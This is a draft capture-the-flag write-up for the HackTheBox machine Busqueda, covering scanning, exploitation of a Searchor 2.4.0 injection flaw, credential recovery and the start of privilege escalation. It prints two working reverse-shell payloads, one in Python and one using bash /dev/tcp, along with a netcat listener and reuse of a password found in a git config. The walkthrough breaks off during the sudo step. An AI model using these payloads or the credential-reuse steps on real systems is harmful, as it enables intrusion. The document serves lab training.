---
title: Busqueda
published: 2024-08-05
description: Writeup for an easy labeled linux based HTB machine named Busqueda.
# image: ./devvortex/devvortex_pwned.jpg
tags: [HackTheBox, Linux, Machines]
category: Writeups
draft: true
---

# <center> Busqueda </center>

## Quick notes:
- easy linux based machine

## Scanning and enumeration

### whatweb
```bash
┌──(cyb3ritic㉿kali)-[~/Downloads]
└─$ whatweb 10.10.11.208                        
http://10.10.11.208 [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.11.208], RedirectLocation[http://searcher.htb/], Title[302 Found]
ERROR Opening: http://searcher.htb/ - no address for searcher.htb
```
- host: http://searcher.htb

### nmap scan
```bash
┌──(cyb3ritic㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.10.11.208             
Nmap scan report for 10.10.11.208
Host is up (0.0019s latency).
Not shown: 837 filtered tcp ports (no-response), 161 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### feroxbuster and other enumeration
- No useful information

## searching andd exploiting vulnerability

### web interface
![web interface](./busqueda/web_interface.png)

- input field
- powered by searchor 2.4.0

### script kidde method

- [poc of searchor 2.4.0 on google](https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-)
    - `', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#`

    - searching the above prompt will get u a revese shell and can grab user.txt.

- `la -al` -> .git folder.
- .git/config reveals a url `http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git`
    - we have creds `cody:jh1usoih2bkjaspwe92`
    - we got a domain name `gitea.searcher.htb`

- password for svc user is same as that of cody.
- `sudo -l` reveals

### Playing with input field (alternative method) 
- payload: 
```python
,),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.14.41/1234 0>&1"')#
```

- `nc -lnvp 1234`

- get reverse shell on target machine. `cat ~/user.txt` gives user flag.

<hr>

## Privesc enumeration

- `ls -al` -> gind .git -> `cd .git` -> `ls` -> config file -> `cat config`
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git

May be ssh id ?? cody:jh1usoih2bkjaspwe92

<hr>
- target 1 : ssh login -> cody:jh1usoih2bkjaspwe92 ==> permission denied
- target 2 : ssh login -> svc:jh1usoih2bkjaspwe92  ==> logged in
    - thus creds for svc is svc:jh1usoih2bkjaspwe92

<hr>

- `sudo -l` -> (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

- `sudo pyhton3 /opt/sccripts/system-checkup.py *`
